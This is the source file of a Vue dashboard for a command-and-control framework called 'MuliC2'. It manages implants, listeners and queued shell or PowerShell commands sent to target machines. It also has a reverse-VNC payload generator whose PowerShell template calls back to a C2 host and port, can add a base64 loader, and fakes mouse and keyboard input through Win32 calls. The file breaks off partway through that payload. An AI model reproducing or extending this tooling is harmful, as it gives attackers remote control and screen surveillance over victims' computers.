<template>
  <div class="dashboard">
    <!-- Overview Panel -->
    <div class="overview-panel">
      <h2 class="panel-title">Overview</h2>
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-icon">
            <el-icon size="24" color="#67C23A"><Monitor /></el-icon>
          </div>
          <div class="stat-content">
            <div class="stat-number">{{ stats.totalImplants }}</div>
            <div class="stat-label">Total Connected Implants</div>
          </div>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon">
            <el-icon size="24" color="#409EFF"><Connection /></el-icon>
          </div>
          <div class="stat-content">
            <div class="stat-number">{{ stats.activeListeners }}</div>
            <div class="stat-label">Active Listeners</div>
          </div>
    </div>

        <div class="stat-card">
          <div class="stat-icon">
            <el-icon size="24" color="#E6A23C"><List /></el-icon>
          </div>
          <div class="stat-content">
            <div class="stat-number">{{ stats.runningTasks }}</div>
            <div class="stat-label">Tasks Running</div>
          </div>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon">
            <el-icon size="24" color="#F56C6C"><Clock /></el-icon>
          </div>
          <div class="stat-content">
            <div class="stat-number">{{ stats.lastCheckin }}</div>
            <div class="stat-label">Last Check-in</div>
          </div>
        </div>
      </div>
    </div>

    <!-- Main Dashboard Tabs -->
    <el-tabs v-model="activeTab" type="card" class="dashboard-tabs">
      <!-- Implants Panel -->
      <el-tab-pane label="Implants" name="implants">
        <div class="implants-panel">
          <div class="panel-header">
            <h3>Connected Implants</h3>
            <el-button type="primary" size="small" @click="refreshImplants">
              <el-icon><Refresh /></el-icon>
              Refresh
            </el-button>
          </div>
          
          <div v-if="implants.length === 0" class="empty-state">
            <el-icon size="64" color="#909399"><Connection /></el-icon>
            <h3>No Implants Connected</h3>
            <p>When implants connect to your listeners, they will appear here.</p>
          </div>
          
          <el-table v-else :data="implants" style="width: 100%" class="implants-table">
            <el-table-column prop="name" label="Name/Hostname" width="200" />
            <el-table-column prop="ip" label="IP Address" width="150" />
            <el-table-column prop="type" label="Type" width="120">
              <template #default="scope">
                <el-tag :type="getImplantTypeColor(scope.row.type)">
                  {{ scope.row.type }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="language" label="Language" width="120" />
            <el-table-column prop="status" label="Status" width="100">
              <template #default="scope">
                <el-tag :type="scope.row.status === 'online' ? 'success' : 'danger'">
                  {{ scope.row.status }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="lastCheckin" label="Last Check-in" width="180" />
            <el-table-column label="Actions" width="200">
              <template #default="scope">
                <el-button size="small" @click="selectImplant(scope.row)">
                  <el-icon><Select /></el-icon>
                  Select
                </el-button>
                <el-button size="small" type="warning" @click="disconnectImplant(scope.row)">
                  <el-icon><Close /></el-icon>
                  Disconnect
                </el-button>
              </template>
            </el-table-column>
          </el-table>
        </div>
      </el-tab-pane>

      <!-- Tasks Panel -->
      <el-tab-pane label="Tasks" name="tasks">
        <div class="tasks-panel">
          <div class="panel-header">
            <h3>Command Queue & Task Management</h3>
            <div class="task-controls">
              <el-select v-model="selectedImplant" placeholder="Select Implant" style="width: 200px; margin-right: 10px;">
                <el-option
                  v-for="implant in onlineImplants"
                  :key="implant.id"
                  :label="`${implant.name} (${implant.ip})`"
                  :value="implant.id"
                />
              </el-select>
              <el-button type="primary" @click="showCommandDialog" :disabled="!selectedImplant">
                <el-icon><Plus /></el-icon>
                Send Command
              </el-button>
            </div>
          </div>
          
          <div v-if="tasks.length === 0" class="empty-state">
            <el-icon size="64" color="#909399"><List /></el-icon>
            <h3>No Tasks Available</h3>
            <p>Select an implant and send commands to create tasks.</p>
          </div>
          
          <el-table v-else :data="tasks" style="width: 100%" class="tasks-table">
            <el-table-column prop="id" label="Task ID" width="100" />
            <el-table-column prop="implantName" label="Implant" width="150" />
            <el-table-column prop="command" label="Command" width="300" />
            <el-table-column prop="status" label="Status" width="100">
              <template #default="scope">
                <el-tag :type="getTaskStatusColor(scope.row.status)">
                  {{ scope.row.status }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="createdAt" label="Created" width="180" />
            <el-table-column prop="output" label="Output" width="200">
              <template #default="scope">
                <el-button size="small" @click="viewTaskOutput(scope.row)" v-if="scope.row.output">
                  <el-icon><View /></el-icon>
                  View
                </el-button>
                <span v-else>-</span>
              </template>
            </el-table-column>
            <el-table-column label="Actions" width="150">
              <template #default="scope">
                <el-button size="small" type="danger" @click="cancelTask(scope.row)" v-if="scope.row.status === 'running'">
                  <el-icon><Close /></el-icon>
                  Cancel
                </el-button>
              </template>
            </el-table-column>
          </el-table>
        </div>
      </el-tab-pane>

      <!-- Listeners Panel -->
      <el-tab-pane label="Listeners" name="listeners">
        <div class="listeners-panel">
          <div class="panel-header">
            <h3>Listener Profiles</h3>
            <el-button type="primary" @click="showCreateListenerDialog">
              <el-icon><Plus /></el-icon>
              Create New Listener
            </el-button>
          </div>
          
          <div v-if="listeners.length === 0" class="empty-state">
            <el-icon size="64" color="#909399"><Setting /></el-icon>
            <h3>No Listener Profiles</h3>
            <p>Create a listener profile to start accepting connections.</p>
          </div>
          
          <el-table v-else :data="listeners" style="width: 100%" class="listeners-table">
            <el-table-column prop="name" label="Profile Name" width="150" />
            <el-table-column prop="protocol" label="Protocol" width="100" />
            <el-table-column prop="host" label="Host" width="150" />
            <el-table-column prop="port" label="Port" width="100" />
            <el-table-column prop="isActive" label="Status" width="100">
              <template #default="scope">
                <el-tag :type="scope.row.isActive ? 'success' : 'info'">
                  {{ scope.row.isActive ? 'Active' : 'Inactive' }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="connections" label="Connections" width="100" />
            <el-table-column prop="createdAt" label="Created" width="180" />
            <el-table-column label="Actions" width="200">
              <template #default="scope">
                <el-button size="small" @click="startListener(scope.row)" v-if="!scope.row.isActive">
                  <el-icon><CaretRight /></el-icon>
                  Start
                </el-button>
                <el-button size="small" type="warning" @click="stopListener(scope.row)" v-if="scope.row.isActive">
                  <el-icon><CaretLeft /></el-icon>
                  Stop
                </el-button>
                <el-button size="small" type="danger" @click="deleteListener(scope.row)" v-if="!scope.row.isActive">
                  <el-icon><Delete /></el-icon>
                  Delete
                </el-button>
              </template>
            </el-table-column>
          </el-table>
        </div>
      </el-tab-pane>

      <!-- Agents Panel -->
      <el-tab-pane label="Agents" name="agents">
        <div class="agents-panel">
          <div class="panel-header">
            <h3>Agent Management</h3>
            <p>Manage and monitor connected agents</p>
          </div>
          
          <div v-if="agents.length === 0" class="empty-state">
            <el-icon size="64" color="#909399"><User /></el-icon>
            <h3>No Agents Connected</h3>
            <p>When agents connect to your listeners, they will appear here.</p>
          </div>
          
          <el-table v-else :data="agents" style="width: 100%" class="agents-table">
            <el-table-column prop="hostname" label="Hostname" width="200" />
            <el-table-column prop="ip" label="IP Address" width="150" />
            <el-table-column prop="username" label="User" width="120" />
            <el-table-column prop="os" label="OS" width="100" />
            <el-table-column prop="status" label="Status" width="100">
              <template #default="scope">
                <el-tag :type="scope.row.status === 'online' ? 'success' : 'danger'">
                  {{ scope.row.status }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="lastSeen" label="Last Seen" width="180" />
            <el-table-column label="Actions" width="200">
              <template #default="scope">
                <el-button size="small" @click="selectAgent(scope.row)">
                  <el-icon><Select /></el-icon>
                  Select
            </el-button>
                <el-button size="small" type="warning" @click="disconnectAgent(scope.row)">
                  <el-icon><Close /></el-icon>
                  Disconnect
                </el-button>
              </template>
            </el-table-column>
          </el-table>
          </div>
      </el-tab-pane>



      <!-- VNC Panel - Reverse VNC Payload Generator & Viewer -->
      <el-tab-pane label="VNC" name="vnc">
        <div class="vnc-panel">
          <div class="panel-header">
            <h3>Reverse VNC System</h3>
            <p>Generate VNC payloads and control remote screens</p>
          </div>
          
          <!-- VNC Configuration Form -->
          <div class="vnc-generator">
            <el-form :model="vncForm" label-width="150px" class="vnc-form">
              <el-row :gutter="20">
                <el-col :span="12">
                  <el-form-item label="Target Listener:">
                    <el-select v-model="selectedListenerId" placeholder="Select active HTTPS listener" style="width: 100%" @change="updateVncFormFromListener">
                      <el-option
                        v-for="listener in activeHTTPSListeners"
                        :key="listener.id"
                        :label="`${listener.name} (${listener.host}:${listener.port})`"
                        :value="listener.id"
                      />
                    </el-select>
                    <span class="form-help">Choose which HTTPS listener the VNC payload connects to</span>
                  </el-form-item>
                </el-col>
                <el-col :span="12">
                  <el-form-item label="Connection Info:">
                    <div class="connection-info">
                      <p><strong>Target:</strong> {{ selectedListener ? `${selectedListener.host === '0.0.0.0' ? (getCurrentHostname()) : selectedListener.host}:${selectedListener.port}` : 'No listener selected' }}</p>
                    </div>
                  </el-form-item>
                </el-col>
              </el-row>
              
              <el-row :gutter="20">
                <el-col :span="12">
                  <el-form-item label="Payload Type:">
                    <el-select v-model="vncForm.payloadType" placeholder="Select payload type">
                      <el-option label="PowerShell" value="powershell" />
                      <el-option label="Executable (.exe)" value="exe" />
                    </el-select>
                  </el-form-item>
                </el-col>
                <el-col :span="12">
                  <el-form-item label="Use Loader:">
                    <el-switch v-model="vncForm.useLoader" />
                    <span class="form-help">Apply base64 encoding wrapper</span>
                  </el-form-item>
                </el-col>
              </el-row>
              
              <el-form-item>
                <el-button type="primary" @click="generateVncPayload" :loading="generatingVnc">
                  <el-icon><Setting /></el-icon>
                  Generate VNC Payload
                </el-button>
                <el-button type="warning" @click="clearVncForm">
                  <el-icon><Delete /></el-icon>
                  Clear
                </el-button>
                <el-button type="info" @click="autoFillVncFromConfig">
                  <el-icon><Connection /></el-icon>
                  Use Server Config
                </el-button>
                <el-button type="success" @click="refreshListeners">
                  <el-icon><Refresh /></el-icon>
                  Refresh Listeners
                </el-button>
              </el-form-item>
            </el-form>
          </div>
          
          <!-- Generated VNC Payload Output -->
          <div v-if="generatedVncPayload" class="vnc-output">
            <h3>Generated VNC Payload:</h3>
            <div class="vnc-info">
              <p><strong>Target Listener:</strong> {{ selectedListener ? selectedListener.name : 'None' }}</p>
              <p><strong>Connection:</strong> {{ selectedListener ? `${selectedListener.host === '0.0.0.0' ? getCurrentHostname() : selectedListener.host}:${selectedListener.port}` : 'None' }}</p>
              <p><strong>Type:</strong> {{ vncForm.payloadType }}</p>
              <p><strong>Loader:</strong> {{ vncForm.useLoader ? 'Enabled' : 'Disabled' }}</p>
              <p><strong>Generated:</strong> {{ new Date().toLocaleString() }}</p>
            </div>
            <div class="code-container">
              <el-input
                v-model="generatedVncPayload"
                type="textarea"
                :rows="12"
                readonly
                class="vnc-code"
              />
              <div class="code-actions">
                <el-button type="success" @click="copyVncPayload">
                  <el-icon><CopyDocument /></el-icon>
                  Copy Payload
                </el-button>
                <el-button type="warning" @click="downloadVncPayload">
                  <el-icon><Download /></el-icon>
                  Download as .ps1
                </el-button>

              </div>
            </div>
          </div>
          
          <!-- VNC Viewer & Control Section -->
          <div class="vnc-viewer">
            <h3>VNC Viewer & Control</h3>
            <p>Monitor and control remote screens from connected VNC agents</p>
            
            <div class="vnc-status">
              <div class="status-indicator">
                <span class="status-dot" :class="{ active: vncConnected }"></span>
                <span class="status-text">{{ vncConnected ? 'VNC Agent Connected' : 'No VNC Agent Connected' }}</span>
              </div>
              <div v-if="vncConnected" class="connection-info">
                <p><strong>Agent:</strong> {{ vncAgentInfo.hostname || 'Unknown' }}</p>
                <p><strong>IP:</strong> {{ vncAgentInfo.ip || 'Unknown' }}</p>
                <p><strong>Resolution:</strong> {{ vncAgentInfo.resolution || '200x150' }}</p>
                <p><strong>FPS:</strong> {{ vncAgentInfo.fps || '5' }}</p>
                <p><strong>Frames Received:</strong> {{ vncFrameCount }}</p>
              </div>
            </div>
            
            <div v-if="activeTab === 'vnc'" class="vnc-controls">
             <div class="control-buttons">
                <el-button type="primary" @click="startVncViewer" :disabled="vncViewerActive">
                  <el-icon><VideoPlay /></el-icon>
                  Start Viewer
                  </el-button>
                <el-button type="warning" @click="stopVncViewer" :disabled="!vncViewerActive">
                  <el-icon><VideoPause /></el-icon>
                  Stop Viewer
      </el-button>
                <el-button type="success" @click="captureScreenshot" :disabled="!vncViewerActive">
                  <el-icon><Camera /></el-icon>
                  Capture Screenshot
                </el-button>
                <el-button type="info" @click="toggleFullscreen" :disabled="!vncViewerActive">
                  <el-icon><FullScreen /></el-icon>
                  Fullscreen
                </el-button>
          </div>
              
              <div class="vnc-settings">
                <el-form :model="vncSettings" label-width="120px" size="small">
                  <el-form-item label="Quality:">
                    <el-slider v-model="vncSettings.quality" :min="1" :max="10" :step="1" />
                  </el-form-item>
                  <el-form-item label="FPS Limit:">
                    <el-input-number v-model="vncSettings.fpsLimit" :min="1" :max="30" :step="1" />
                  </el-form-item>
                </el-form>
        </div>
            </div>
            
            <div v-if="vncViewerActive" class="vnc-display">
              <canvas ref="vncCanvas" class="vnc-canvas" width="800" height="600"></canvas>
              <div class="vnc-overlay">
                <div class="overlay-info">
                  <span>Resolution: {{ vncAgentInfo.resolution || '200x150' }}</span>
                  <span>FPS: {{ vncCurrentFps }}</span>
                  <span>Frame: {{ vncFrameCount }}</span>
                </div>
              </div>
            </div>
            <!-- Add CTRL+ALT+DEL button below VNC controls -->
            <div v-if="vncViewerActive && vncConnected" style="margin-bottom: 10px;">
              <el-button type="danger" @click="sendCtrlAltDel" icon="el-icon-warning">Send CTRL+ALT+DELETE</el-button>
              <el-button type="primary" @click="sendShowMessageBox" icon="el-icon-info">Show MessageBox</el-button>
            </div>

            <div v-if="!vncConnected" class="vnc-waiting">
              <el-empty description="Waiting for VNC Agent Connection">
                <template #description>
                  <p>No VNC agents are currently connected.</p>
                  <p>Deploy a VNC payload to a target system to establish connection.</p>
                </template>
              </el-empty>
            </div>
          </div>
    </div>
      </el-tab-pane>
    </el-tabs>

    <!-- Command Dialog -->
    <el-dialog v-model="commandDialogVisible" title="Send Command" width="600px">
      <el-form :model="commandForm" label-width="100px">
        <el-form-item label="Implant:">
          <el-input v-model="selectedImplantName" disabled />
        </el-form-item>
        <el-form-item label="Command:">
          <el-input
            v-model="commandForm.command"
            type="textarea"
            :rows="4"
            placeholder="Enter command to execute on the target agent..."
          />
        </el-form-item>
        <el-form-item label="Command Type:">
          <el-select v-model="commandForm.type" placeholder="Select command type">
            <el-option label="Shell Command" value="shell" />
            <el-option label="PowerShell" value="powershell" />
            <el-option label="Script" value="script" />
          </el-select>
        </el-form-item>
        <el-form-item label="Schedule:">
          <el-switch v-model="commandForm.scheduled" />
          <span style="margin-left: 10px; color: #909399;">Schedule for later execution</span>
        </el-form-item>
        <el-form-item v-if="commandForm.scheduled" label="Execute At:">
          <el-date-picker
            v-model="commandForm.executeAt"
            type="datetime"
            placeholder="Select execution time"
          />
        </el-form-item>
      </el-form>
      
      <template #footer>
        <el-button @click="commandDialogVisible = false">Cancel</el-button>
        <el-button type="primary" @click="sendCommand" :loading="sendingCommand">
          Send Command
        </el-button>
      </template>
    </el-dialog>

    <!-- Create Listener Dialog -->
    <el-dialog v-model="listenerDialogVisible" title="Create New Listener" width="500px">
      <el-form :model="listenerForm" label-width="120px">
        <el-form-item label="Profile Name:">
          <el-input v-model="listenerForm.name" placeholder="Enter profile name" />
        </el-form-item>
        <el-form-item label="Protocol:">
          <el-select v-model="listenerForm.protocol" placeholder="Select protocol">
            <el-option label="TCP" value="tcp" />
            <el-option label="HTTP" value="http" />
            <el-option label="HTTPS" value="https" />
          </el-select>
        </el-form-item>
        <el-form-item label="Host:">
          <el-input v-model="listenerForm.host" placeholder="0.0.0.0" />
        </el-form-item>
        <el-form-item label="Port:">
          <el-input v-model="listenerForm.port" placeholder="8080" />
        </el-form-item>
        <el-form-item label="Description:">
          <el-input
            v-model="listenerForm.description"
            type="textarea"
            :rows="3"
            placeholder="Optional description"
          />
        </el-form-item>
      </el-form>
      
      <template #footer>
        <el-button @click="listenerDialogVisible = false">Cancel</el-button>
        <el-button type="primary" @click="createListener" :loading="creatingListener">
          Create Listener
        </el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { ref, computed, onMounted, watch, onUnmounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'

// Types
interface Implant {
  id: string
  name: string
  ip: string
  type: string
  language: string
  status: string
  lastCheckin: string
}

interface Task {
  id: string
  implantName: string
  command: string
  status: string
  createdAt: string
  output: string | null
}

interface Listener {
  id: string
  name: string
  projectName?: string
  host: string
  port: number
  description?: string
  useTLS: boolean
  certFile?: string
  keyFile?: string
  isActive: boolean
  createdAt: string
  updatedAt: string
}

// Dashboard state
const activeTab = ref('implants')

// Stats data
const stats = ref({
  totalImplants: 0,
  activeListeners: 0,
  runningTasks: 0,
  lastCheckin: 'Never'
})

// Implants data
const implants = ref<Implant[]>([])

// Tasks data
const tasks = ref<Task[]>([])

// Listeners data
const listeners = ref<Listener[]>([])

// Command dialog
const commandDialogVisible = ref(false)
const selectedImplant = ref('')
const selectedImplantName = ref('')
const commandForm = ref({
  command: '',
  type: 'shell',
  scheduled: false,
  executeAt: null
})
const sendingCommand = ref(false)

// Listener dialog
const listenerDialogVisible = ref(false)
const listenerForm = ref({
  name: '',
  protocol: 'tcp',
  host: '0.0.0.0',
  port: '8080',
  description: ''
})
const creatingListener = ref(false)

// VNC Payload Generator
const vncForm = ref({
  lhost: '', // Auto-filled from selected listener
  c2Port: '', // Auto-filled from selected listener
  payloadType: 'powershell',
  useLoader: true
})
const selectedListenerId = ref<string>('')
const generatingVnc = ref(false)
const generatedVncPayload = ref('')

// VNC Viewer & Control Data
const vncConnected = ref(false)
const vncViewerActive = ref(false)
const vncFrameCount = ref(0)
const vncCurrentFps = ref(0)
const vncCanvas = ref<HTMLCanvasElement | null>(null)
const vncAgentInfo = ref({
  hostname: '',
  ip: '',
  resolution: '200x150',
  fps: '5'
})
const vncSettings = ref({
  quality: 5,
  fpsLimit: 5
})





// Agent management
const agents = ref<any[]>([])

interface Profile {
  id: string
  name: string
  projectName?: string
  host: string
  port: number
  description?: string
  useTLS: boolean
  certFile?: string
  keyFile?: string
  pollInterval: number
  isActive: boolean
  createdAt: string
  updatedAt: string
}

const availableProfiles = ref<Profile[]>([])

// API base URL - change this to your Linux VM's IP and port
// If your backend is running on a different IP/port, update this value
const API_BASE_URL = 'http://192.168.0.111:8080'

// Utility function for authenticated API requests
const authenticatedFetch = async (url: string, options: RequestInit = {}) => {
  const token = localStorage.getItem('auth_token')
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...options.headers as Record<string, string>
  }
  
  if (token) {
    headers['Authorization'] = `Bearer ${token}`
  }
  
  // Prepend API base URL to relative URLs
  const fullUrl = url.startsWith('http') ? url : `${API_BASE_URL}${url}`
  
  const response = await fetch(fullUrl, {
    ...options,
    headers
  })
  
  if (response.status === 401) {
    console.error('API: Unauthorized - token may be invalid or expired')
    ElMessage.error('Authentication required. Please log in again.')
    // Clear invalid token and redirect to login
    localStorage.removeItem('auth_token')
    localStorage.removeItem('user_data')
    window.location.href = '/login'
    throw new Error('Unauthorized')
  }
  
  return response
}

// Load available profiles
const loadProfiles = async () => {
  try {
    const response = await authenticatedFetch('/api/profile/list')
    
    if (!response.ok) {
      console.error('Profile API not available - server returned:', response.status, response.statusText)
      ElMessage.error(`Failed to load profiles: Server returned ${response.status} ${response.statusText}`)
      availableProfiles.value = []
      return
    }
    
    const contentType = response.headers.get('content-type')
    if (!contentType || !contentType.includes('application/json')) {
      console.error('Profile API returned non-JSON response:', contentType)
      ElMessage.error('Failed to load profiles: Invalid response format from server')
      availableProfiles.value = []
      return
    }
    
    const data = await response.json()
    availableProfiles.value = data.profiles || []
    
    if (availableProfiles.value.length === 0) {
      ElMessage.warning('No profiles found. Please create profiles in the backend configuration.')
    }
  } catch (error) {
    if (error instanceof Error && error.message === 'Unauthorized') {
      return // Already handled by authenticatedFetch
    }
    console.error('Failed to load profiles:', error)
    ElMessage.error('Failed to load profiles: Network error or server unavailable')
    availableProfiles.value = []
  }
}

// Get profile by ID
const getProfileById = (profileId: string): Profile | undefined => {
  return availableProfiles.value.find(p => p.id === profileId)
}

// Computed properties
const onlineImplants = computed(() => {
  return implants.value.filter(implant => implant.status === 'online')
})

const hasActiveListener = computed(() => {
  return listeners.value.some(listener => listener.isActive)
})

const activeListener = computed(() => {
  return listeners.value.find(listener => listener.isActive)
})

// Methods
const refreshImplants = () => {
  ElMessage.success('Implants refreshed')
  // TODO: Implement actual refresh logic
}

const selectImplant = (implant: any) => {
  selectedImplant.value = implant.id
  selectedImplantName.value = implant.name
  activeTab.value = 'tasks'
  ElMessage.success(`Selected implant: ${implant.name}`)
}

const disconnectImplant = async (implant: any) => {
  try {
    await ElMessageBox.confirm(
      `Are you sure you want to disconnect ${implant.name}?`,
      'Disconnect Implant',
      { confirmButtonText: 'Disconnect', cancelButtonText: 'Cancel', type: 'warning' }
    )
    
    // TODO: Implement actual disconnect logic
    ElMessage.success(`Disconnected ${implant.name}`)
  } catch {
    // User cancelled
  }
}

const showCommandDialog = () => {
  if (!selectedImplant.value) {
    ElMessage.warning('Please select an implant first')
    return
  }
  commandDialogVisible.value = true
}

const sendCommand = async () => {
  if (!commandForm.value.command.trim()) {
    ElMessage.error('Please enter a command')
    return
  }
  
  sendingCommand.value = true
  
  try {
    // TODO: Implement actual command sending logic
    await new Promise(resolve => setTimeout(resolve, 1000))
    
    const newTask = {
      id: `T${Date.now()}`,
      implantName: selectedImplantName.value,
      command: commandForm.value.command,
      status: 'queued',
      createdAt: new Date().toLocaleString(),
      output: null
    }
    
    tasks.value.unshift(newTask)
    
    ElMessage.success('Command sent successfully')
    commandDialogVisible.value = false
    commandForm.value.command = ''
    activeTab.value = 'tasks'
  } catch (error) {
    ElMessage.error('Failed to send command')
  } finally {
    sendingCommand.value = false
  }
}

const viewTaskOutput = (task: any) => {
  ElMessageBox.alert(task.output, `Task Output - ${task.id}`, {
    confirmButtonText: 'Close'
  })
}

const cancelTask = async (task: any) => {
  try {
    await ElMessageBox.confirm(
      `Cancel task ${task.id}?`,
      'Cancel Task',
      { confirmButtonText: 'Cancel Task', cancelButtonText: 'No', type: 'warning' }
    )
    
    // TODO: Implement actual task cancellation
    task.status = 'cancelled'
    ElMessage.success('Task cancelled')
  } catch {
    // User cancelled
  }
}

const showCreateListenerDialog = () => {
  listenerDialogVisible.value = true
}

const createListener = async () => {
  if (!listenerForm.value.name || !listenerForm.value.port) {
    ElMessage.error('Please fill in all required fields')
    return
  }
  
  // Validate port - prevent VNC ports and privileged ports
  const port = parseInt(listenerForm.value.port)
  if (port === 5900 || port === 5901 || port === 5902) {
    ElMessage.error('Port 5900-5902 are VNC ports. Please use a different port for C2 listeners.')
    return
  }
  if (port < 1024) {
    ElMessage.warning('Ports below 1024 require root privileges. Consider using port 8080, 8443, or 8444.')
  }
  
  creatingListener.value = true
  
  try {
    // Create listener via API
    const response = await authenticatedFetch('/api/listeners', {
      method: 'POST',
      body: JSON.stringify({
      name: listenerForm.value.name,
        projectName: 'MuliC2',
      host: listenerForm.value.host,
        port: parseInt(listenerForm.value.port),
        description: listenerForm.value.description,
        useTLS: listenerForm.value.protocol === 'https',
        certFile: listenerForm.value.protocol === 'https' ? '../server.crt' : '',
        keyFile: listenerForm.value.protocol === 'https' ? '../server.key' : '',
        isActive: false
      })
    })
    
    if (!response.ok) {
      throw new Error(`Failed to create listener: ${response.status}`)
    }
    
    const newListener = await response.json()
    listeners.value.unshift(newListener)
    
    ElMessage.success('Listener created successfully')
    listenerDialogVisible.value = false
    listenerForm.value = { name: '', protocol: 'tcp', host: '0.0.0.0', port: '8080', description: '' }
  } catch (error) {
    console.error('Failed to create listener:', error)
    const errorMessage = error instanceof Error ? error.message : 'Unknown error'
    ElMessage.error(`Failed to create listener: ${errorMessage}`)
  } finally {
    creatingListener.value = false
  }
}

const startListener = async (listener: any) => {
  try {
    // Start listener via API
    const response = await authenticatedFetch(`/api/listeners/${listener.id}/start`, {
      method: 'POST'
    })
    
    if (!response.ok) {
      throw new Error(`Failed to start listener: ${response.status}`)
    }
    
    const result = await response.json()
    listener.isActive = true
    // If this is TLS, refresh C2 port from this listener
    if (listener.useTLS) {
      vncForm.value.c2Port = String(listener.port)
    }
    ElMessage.success(`Started listener: ${listener.name}`)
    
    // Refresh dashboard data to update the VNC dropdown
    await loadDashboardData()
  } catch (error) {
    console.error('Failed to start listener:', error)
    const errorMessage = error instanceof Error ? error.message : 'Unknown error'
    ElMessage.error(`Failed to start listener: ${errorMessage}`)
  }
}

const stopListener = async (listener: any) => {
  try {
    await ElMessageBox.confirm(
      `Stop listener ${listener.name}? This will disconnect all active connections.`,
      'Stop Listener',
      { confirmButtonText: 'Stop', cancelButtonText: 'Cancel', type: 'warning' }
    )
    
    // Stop listener via API
    const response = await authenticatedFetch(`/api/listeners/${listener.id}/stop`, {
      method: 'POST'
    })
    
    if (!response.ok) {
      throw new Error(`Failed to stop listener: ${response.status}`)
    }
    
    listener.isActive = false
    // If we stopped the active TLS listener, try to pick another active TLS listener or profile
    if (listener.useTLS) {
      setPortFromActiveListener()
      if (!activeTLSListener.value) {
        setPortFromActiveProfile()
      }
    }
    ElMessage.success(`Stopped listener: ${listener.name}`)
  } catch (error) {
    if (error !== 'cancel') {
      console.error('Failed to stop listener:', error)
      const errorMessage = error instanceof Error ? error.message : 'Unknown error'
      ElMessage.error(`Failed to stop listener: ${errorMessage}`)
    }
  }
}

const deleteListener = async (listener: any) => {
  try {
    await ElMessageBox.confirm(
      `Delete listener profile ${listener.name}?`,
      'Delete Listener',
      { confirmButtonText: 'Delete', cancelButtonText: 'Cancel', type: 'warning' }
    )
    
    // Delete listener via API
    const response = await authenticatedFetch(`/api/listeners/${listener.id}`, {
      method: 'DELETE'
    })
    
    if (!response.ok) {
      throw new Error(`Failed to delete listener: ${response.status}`)
    }
    
    listeners.value = listeners.value.filter(l => l.id !== listener.id)
    ElMessage.success('Listener deleted')
  } catch (error) {
    if (error !== 'cancel') {
      console.error('Failed to delete listener:', error)
      const errorMessage = error instanceof Error ? error.message : 'Unknown error'
      ElMessage.error(`Failed to delete listener: ${errorMessage}`)
    }
  }
}

// Agent management methods
const selectAgent = (agent: any) => {
  // TODO: Implement agent selection logic
  ElMessage.success(`Selected agent: ${agent.hostname}`)
}

const disconnectAgent = async (agent: any) => {
  try {
    await ElMessageBox.confirm(
      `Disconnect agent ${agent.hostname}?`,
      'Disconnect Agent',
      { confirmButtonText: 'Disconnect', cancelButtonText: 'Cancel', type: 'warning' }
    )
    
    // TODO: Implement actual agent disconnection logic
    ElMessage.success(`Disconnected agent: ${agent.hostname}`)
  } catch {
    // User cancelled
  }
}

// VNC Payload Generator Functions
const generateVncPayload = async () => {
  if (!selectedListener.value) {
    ElMessage.error('No HTTPS listener selected. Please select an active HTTPS listener first.')
    return
  }

  if (!selectedListener.value.isActive) {
    ElMessage.error('Selected listener is not active. Please start the listener first.')
    return
  }
  
  generatingVnc.value = true
  
  try {
    // Get connection details from the selected listener
    const c2Host = selectedListener.value.host === '0.0.0.0' ? getCurrentHostname() : selectedListener.value.host
    const c2Port = selectedListener.value.port
    
    console.log('VNC Configuration:', { c2Host, c2Port })
    
    let payload = `
# MuliC2 VNC Screen Capture Agent
# C2 Host: ${c2Host}
# C2 Port: ${c2Port}
# Type: ${vncForm.value.payloadType}
# Loader: ${vncForm.value.useLoader ? 'Enabled' : 'Disabled'}
# Generated: ${new Date().toLocaleString()}

param(
    [string]$C2Host = "${c2Host}",
    [int]$C2Port = ${c2Port}
)

# Add required assemblies with error handling
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    Write-Host "[+] Required assemblies loaded successfully" -ForegroundColor Green
} catch {
    Write-Host "[!] Error loading required assemblies: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Make sure you're running on a system with GUI support" -ForegroundColor Red
    exit 1
}

# Add Win32 API definitions for input simulation
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32API {
    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern short VkKeyScan(char ch);
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int X; public int Y; }
    public const int MOUSEEVENTF_MOVE = 0x0001;
    public const int MOUSEEVENTF_LEFTDOWN = 0x0002;
    public const int MOUSEEVENTF_LEFTUP = 0x0004;
    public const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const int MOUSEEVENTF_RIGHTUP = 0x0010;
    public const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    public const int MOUSEEVENTF_MIDDLEUP = 0x0040;
    public const int MOUSEEVENTF_WHEEL = 0x0800;
    public const uint KEYEVENTF_KEYUP = 0x0002;
    public const uint KEYEVENTF_UNICODE = 0x0004;
}
"@

# --- Input Event Simulation Functions ---
function Invoke-MouseEvent {
    param(
        [string]$event,
        [float]$x,
        [float]$y,
        [int]$button = 0,
        [int]$buttons = 0
    )
    try {
        $screenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
        $screenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
        $px = [int]($x * $screenWidth)
        $py = [int]($y * $screenHeight)
        Write-Host "[*] Mouse event: $event at screen coords ($px, $py) from relative ($x, $y)" -ForegroundColor Cyan
        [Win32API]::SetCursorPos($px, $py)
        switch ($event) {
            'mousedown' {
                switch ($button) {
